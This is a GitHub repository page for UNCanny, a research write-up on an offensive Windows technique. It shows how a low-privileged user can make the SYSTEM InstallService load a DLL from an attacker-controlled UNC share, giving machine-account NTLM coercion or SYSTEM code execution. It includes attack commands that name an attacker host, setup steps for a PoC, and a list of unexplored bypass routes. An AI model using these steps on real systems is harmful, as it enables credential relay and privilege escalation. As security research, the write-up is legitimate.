# https://github.com/0xHossam/UnCanny

[Skip to content](https://github.com/0xHossam/UnCanny#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/0xHossam/UnCanny) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/0xHossam/UnCanny) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/0xHossam/UnCanny) to refresh your session.Dismiss alert

{{ message }}

[0xHossam](https://github.com/0xHossam)/ **[UnCanny](https://github.com/0xHossam/UnCanny)** Public

- [Notifications](https://github.com/login?return_to=%2F0xHossam%2FUnCanny) You must be signed in to change notification settings
- [Fork\\
9](https://github.com/login?return_to=%2F0xHossam%2FUnCanny)
- [Star\\
68](https://github.com/login?return_to=%2F0xHossam%2FUnCanny)


main

[**1** Branch](https://github.com/0xHossam/UnCanny/branches) [**0** Tags](https://github.com/0xHossam/UnCanny/tags)

[Go to Branches page](https://github.com/0xHossam/UnCanny/branches)[Go to Tags page](https://github.com/0xHossam/UnCanny/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![0xHossam](https://avatars.githubusercontent.com/u/82971998?v=4&size=40)](https://github.com/0xHossam)[0xHossam](https://github.com/0xHossam/UnCanny/commits?author=0xHossam)<br>[better clarity](https://github.com/0xHossam/UnCanny/commit/bd0e27d14e345de0e65a0b020cace63285495d6c)<br>15 hours agoJun 20, 2026<br>[bd0e27d](https://github.com/0xHossam/UnCanny/commit/bd0e27d14e345de0e65a0b020cace63285495d6c) · 15 hours agoJun 20, 2026<br>## History<br>[11 Commits](https://github.com/0xHossam/UnCanny/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/0xHossam/UnCanny/commits/main/) 11 Commits |
| [lpe](https://github.com/0xHossam/UnCanny/tree/main/lpe "lpe") | [lpe](https://github.com/0xHossam/UnCanny/tree/main/lpe "lpe") | [improvements](https://github.com/0xHossam/UnCanny/commit/f3f987063a6ccafbfe87b668d2701f8a8d677187 "improvements") | last weekJun 13, 2026 |
| [pics](https://github.com/0xHossam/UnCanny/tree/main/pics "pics") | [pics](https://github.com/0xHossam/UnCanny/tree/main/pics "pics") | [improvements](https://github.com/0xHossam/UnCanny/commit/f3f987063a6ccafbfe87b668d2701f8a8d677187 "improvements") | last weekJun 13, 2026 |
| [poc](https://github.com/0xHossam/UnCanny/tree/main/poc "poc") | [poc](https://github.com/0xHossam/UnCanny/tree/main/poc "poc") | [uploading the lpe experiment](https://github.com/0xHossam/UnCanny/commit/777f38753242b6037d938080e2bc9fd7509e1543 "uploading the lpe experiment") | last weekJun 13, 2026 |
| [.gitattributes](https://github.com/0xHossam/UnCanny/blob/main/.gitattributes ".gitattributes") | [.gitattributes](https://github.com/0xHossam/UnCanny/blob/main/.gitattributes ".gitattributes") | [Initial commit](https://github.com/0xHossam/UnCanny/commit/b2a01d72613e60acc67491efb9d823aff12a8d60 "Initial commit") | last weekJun 13, 2026 |
| [README.md](https://github.com/0xHossam/UnCanny/blob/main/README.md "README.md") | [README.md](https://github.com/0xHossam/UnCanny/blob/main/README.md "README.md") | [better clarity](https://github.com/0xHossam/UnCanny/commit/bd0e27d14e345de0e65a0b020cace63285495d6c "better clarity") | 15 hours agoJun 20, 2026 |
| View all files |

## Repository files navigation

# UNCanny Coerce

[Permalink: UNCanny Coerce](https://github.com/0xHossam/UnCanny#uncanny-coerce)

The idea behind this research was simple as i wanted to find my own coercion technique. i started by looking for new RPC attack surfaces, but after microsoft added RPC activity monitoring ( [https://techcommunity.microsoft.com/blog/microsoftdefenderatpblog/microsoft-defender-now-monitors-rpc-activity/4523368](https://techcommunity.microsoft.com/blog/microsoftdefenderatpblog/microsoft-defender-now-monitors-rpc-activity/4523368)), i decided to take a different path.

UNCanny is the result of that rabbit hole. it is not something i would consider reliable for real red team ops because of its limitation, but i still think the notes are worth publishing for anyone digging into the same area.

* * *

shortly this primitive is:

> a normal user hands the windows store install service some install metadata -> the service, running as local system, resolves a "plugin" for that work -> the resolver ends up doing `LoadLibraryW` on a path the user influenced -> that path is a UNC -> outbound NTLM as the machine account.

the component is the windows store install service world: `InstallService.dll` hosted in `InstallService.exe`, running as `NT AUTHORITY\SYSTEM`.

## finding the weird surface

[Permalink: finding the weird surface](https://github.com/0xHossam/UnCanny#finding-the-weird-surface)

The rabbit hole started with `InstallService.dll`. I was looking at windows components that install packages, restore state after reboot, resume failed jobs, read local/remote content, and load plugins. anything that has those four things together usually has a boundary confusion somewhere:

- it has a public-ish caller side because normal userland needs to request installs
- it has a privileged worker side because package install/state management needs service rights
- it has serialization because work must survive reboot
- it has plugin loading because windows likes making simple things modular and scary

The interesting runtime class was:

```
Windows.Internal.InstallService.Control.InstallServiceControl
IID:    e4893a99-9270-42b9-9a62-683d6ceed250
method: vtable slot 8  ->  CreateInstallServiceWork(cv, caller, _, _, propertiesJson, optionsJson, out items)
```

[![alt text](https://github.com/0xHossam/UnCanny/raw/main/pics/image.png)](https://github.com/0xHossam/UnCanny/blob/main/pics/image.png)

That `propertiesJson` parameter is where the fun lives. install behaviour is described by json fields like `FulfillmentPluginId`, `SourceUri`, `PackageFamilyName`, `SerializedFulfillmentData`, `SkipCatalogLookup`, `ProductId`, `SkuId`.

At first I thought the bug was going to be "put a UNC in `SourceUri` and let the service read it". that would have been beautiful, but windows was not that generous. i reversed the built-in fulfillment path (`CreateInstallServiceWorkFromBridge`, `InstallService.dll`) and the built-in plugins just don't do that:

- `WU` parses the json and goes out over WinHTTP / Delivery Optimization. never SMB.
- `ChainedWork` and `XVC` are the same story or are not even present on a client.
- a raw `SourceUri` either gets rejected fast or routed into catalog validation. `CreateCatalogItemFromLocalData` despite the name builds a catalog item from the in-memory serialized json, it does not go open a file.

So the naive idea is a dead end, this feature is very intersting and i'm doing other research primitives on it too and that is worth saying out loud so nobody wastes a week on it :)

## SYSTEM touch a path

[Permalink: SYSTEM touch a path](https://github.com/0xHossam/UnCanny#system-touch-a-path)

the only place in the whole create/restore flow where the service touches an attacker-influenced path is plugin activation. the function is `PluginHelpers::ActivatePlugin`. it resolves `FulfillmentPluginId` in this order:

1. `"WU"` -\> built-in
2. `"ChainedWork"` -\> built-in
3. value found in `StaticPluginMap` (HKLM) -> `CoCreateInstance` a CLSID, or activate a WinRT class
4. `"XVC"` -\> xbox factory
5. **anything else -> treat it as a package family name.**`FindPackagesForUser(pfn)` -\> take that package's `InstalledLocation.Path` -\> `LoadLibraryW( path + "\InstallServicePlugin.dll" )` -\> `GetProcAddress("ActivatePlugin")`

branch 5 is the one and `PluginHelpers::IsPluginAvailable` confirms the gate: it returns true for any `FulfillmentPluginId` that matches an installed package, via the exact same `FindPackagesForUser` lookup.

[![alt text](https://github.com/0xHossam/UnCanny/raw/main/pics/image-5.png)](https://github.com/0xHossam/UnCanny/blob/main/pics/image-5.png)

so if a `FulfillmentPluginId` points at a package whose `InstalledLocation` is a **UNC**, then `InstallService.exe` running as SYSTEM does:

```
LoadLibraryW( \\attacker\share\InstallServicePlugin.dll )
```

`LoadLibraryW` has to connect to `\\attacker\share` and authenticate before it can find out the dll isn't there and that authentication is the coercion and the dll never has to exist.

[![alt text](https://github.com/0xHossam/UnCanny/raw/main/pics/image-6.png)](https://github.com/0xHossam/UnCanny/blob/main/pics/image-6.png)

## the actual primitive

[Permalink: the actual primitive](https://github.com/0xHossam/UnCanny#the-actual-primitive)

the only question left is "how does a normal user get a package whose `InstalledLocation` is a UNC". the answer is loose-file registration, which is a per-user, non-elevated operation:

```
Add-AppxPackage -Register \\attacker\share\AppxManifest.xml
```

windows registers the package "in place", so the registered `InstalledLocation` is literally the UNC you pointed at. then you trigger the work with that package's family name as the plugin id.

1. `Add-AppxPackage -Register \\attacker\share\AppxManifest.xml`
2. `CreateInstallServiceWork( FulfillmentPluginId = <that package's PFN> )`

caller is a normal user, the network authentication is the machine account.

[![alt text](https://github.com/0xHossam/UnCanny/raw/main/pics/image-8.png)](https://github.com/0xHossam/UnCanny/blob/main/pics/image-8.png)

low-priv user triggered it, machine account authenticated. windows' own loader did the UNC touch, not the caller.

[![coercion over smb](https://github.com/0xHossam/UnCanny/raw/main/pics/coerce-smb.png)](https://github.com/0xHossam/UnCanny/blob/main/pics/coerce-smb.png)

## attacker side

[Permalink: attacker side](https://github.com/0xHossam/UnCanny#attacker-side)

two things to sort before running:

- impacket-smbserver reports filesystem type `XTFS`. AppX refuses to register on non-NTFS shares (`0x80073CFD`). patch the `FileSystemName` field in `impacket/smbserver.py` to `NTFS`.

- the share needs `AppxManifest.xml`, `logo.png`, `dummy.exe`. no `InstallServicePlugin.dll` needed. `MaxVersionTested` in the manifest must be ≤ target build (`winver` on the target to check).


You can run `poc/setup.sh` from the repo root on Kali. it populates the share, patches impacket, stages `poc.ps1` on the target via smbclient if `TARGET_IP` and `TARGET_CREDS` are set, and starts the server ;-)

Then on your windows workstation as the low-priv user from an interactive session:

```
powershell -ExecutionPolicy Bypass -File poc.ps1 -AttackerHost ATTACKER_IP -Share coerce
```

## LPE

[Permalink: LPE](https://github.com/0xHossam/UnCanny#lpe)

There is a second side to the same bug that is more direct than coercion. if `InstallServicePlugin.dll` actually exists on the UNC package path, the service still reaches the same `LoadLibraryW(\\attacker\share\InstallServicePlugin.dll)` branch, but this time the loader succeeds and the dll is mapped inside the store install service process as `NT AUTHORITY\SYSTEM`.

So I got hyped trying to proof for this issue and wrote the poc in `lpe/`. the important thing is not another package registration trick, it is the same registered loose package being reused as the plugin package. the harness asks the low-priv user's package family name with `Get-AppxPackage`, passes that PFN as `FulfillmentPluginId`, sets `SkipCatalogLookup=true`, and includes `SerializedFulfillmentData`. that last field matters because `InstallQueue2::CreateWork` rejects the request with `0x80070057` if catalog lookup is skipped without fulfillment data.

It's very important to note about something took long time in troubleshooting which is that **impacket cannot serve a loadable image.** it answers the reads well enough for the machine account to authenticate, so the coercion path is perfectly happy, but `LoadLibraryW` against an impacket share comes back null with `ERROR_INVALID_HANDLE` and `DllMain` never runs. serve the exact same files with a real SMB server (Samba) and the load succeeds. Samba reports `NTFS` by default so the loose registration still goes through. so the rule is simple: impacket when you only want the hash, Samba when you want the dll to actually execute as SYSTEM!

on a real run, triggered by the low-priv user, `uncanny_lpe.txt` shows the dll mapped into `svchost.exe` and the token resolving to `NT AUTHORITY\SYSTEM` / `S-1-5-18`, which is the screenshot below.

[![lpe proof as coercelow](https://github.com/0xHossam/UnCanny/raw/main/pics/lpe-system.png)](https://github.com/0xHossam/UnCanny/blob/main/pics/lpe-system.png)

`CreateInstallServiceWork` still returns `0x800706BE` with this demo dll because `DllMain` already ran by the time the service asks for the real plugin interface and gives up :-)

[![activateplugin loadlibrary branch](https://github.com/0xHossam/UnCanny/raw/main/pics/lpe-ida.png)](https://github.com/0xHossam/UnCanny/blob/main/pics/lpe-ida.png)

## limitations

[Permalink: limitations](https://github.com/0xHossam/UnCanny#limitations)

The limitation is actually the reason i decided to publish this technique - **developer mode must be enabled to perform it.** the whole thing hinges on `InstalledLocation.Path` being a UNC path, and after spending a lot of time digging through it, i only found one way to make that happen. a normal signed install copies the package into `C:\Program Files\WindowsApps\...`, sets `InstalledLocation` there, and that's always a local path.

the only registration path i found that keeps the files where they already are, including on a UNC share, is loose-file registration (`Add-AppxPackage -Register <manifest>`). that's exactly what Developer Mode (`AllowDevelopmentWithoutDevLicense` under `HKLM\...\AppModelUnlock`) unlocks. and the reason it is gated makes sense. loose registration basically creates a trusted package identity from arbitrary unsigned files sitting at a location you control, which completely sidesteps the normal store and signing trust model. because of that, Developer Mode has to be enabled, and that's currently the biggest limitation of the technique.

The interesting part is that the `InstallService` side doesn't really care and once such a package exists, branch 5 of `ActivatePlugin` will happily call `LoadLibraryW` on whatever `InstalledLocation.Path` it receives. the entire problem is getting a package whose install location points at a UNC path in the first place without needing Developer Mode.

So, I started reversing the guard rails looking for another way in.

the Developer Mode check doesn't live inside `InstallService` at all. it sits inside the AppX deployment stack (`AppXDeploymentServer.dll` and the deployment licensing policy) and ultimately reads `HKLM\...\AppModelUnlock`, which is admin-controlled. there is nothing a normal user can flip there.

I also chased what seemed like the obvious bypass such like sideloading

I tested it with sideloading enabled and Developer Mode disabled (`IsSideloadingEnabled=1`, `IsDeveloperModeEnabled=0`). the loose registration immediately failed and complained that the package origin was `Unsigned` and that no valid license or sideloading policy could be applied.

there are still a few routes i haven't fully ruled out yet you can dig if you want:

- `StaticPluginMap` combined with a COM search-order hijack
- `-ExternalLocation` and external package content
- symlinks or junctions
- per-user COM hijacking through `HKCU\...\CLSID`

## detections?

[Permalink: detections?](https://github.com/0xHossam/UnCanny#detections)

Elastic will get this covered in a day probably.

* * *

> - i'm not responsible for how this information is used. this research is published for educational purposes at the end of the day, and also may help improve understanding of the attack surface.

## About

Another new coercion primitive with LPE - machine-account NTLM coercion from a non-admin user via Windows Store InstallService plugin resolution experiments


### Resources

[Readme](https://github.com/0xHossam/UnCanny#readme-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/0xHossam/UnCanny).

[Activity](https://github.com/0xHossam/UnCanny/activity)

### Stars

[**68**\\
stars](https://github.com/0xHossam/UnCanny/stargazers)

### Watchers

[**0**\\
watching](https://github.com/0xHossam/UnCanny/watchers)

### Forks

[**9**\\
forks](https://github.com/0xHossam/UnCanny/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2F0xHossam%2FUnCanny&report=0xHossam+%28user%29)

## [Releases](https://github.com/0xHossam/UnCanny/releases)

No releases published

## [Packages\  0](https://github.com/users/0xHossam/packages?repo_name=UnCanny)

No packages published

## [Contributors\  1](https://github.com/0xHossam/UnCanny/graphs/contributors)

- [![@0xHossam](https://avatars.githubusercontent.com/u/82971998?s=64&v=4)](https://github.com/0xHossam)[**0xHossam** Hossam Ehab](https://github.com/0xHossam)

## Languages

- [C68.7%](https://github.com/0xHossam/UnCanny/search?l=c)
- [PowerShell22.9%](https://github.com/0xHossam/UnCanny/search?l=powershell)
- [Shell8.4%](https://github.com/0xHossam/UnCanny/search?l=shell)

You can’t perform that action at this time.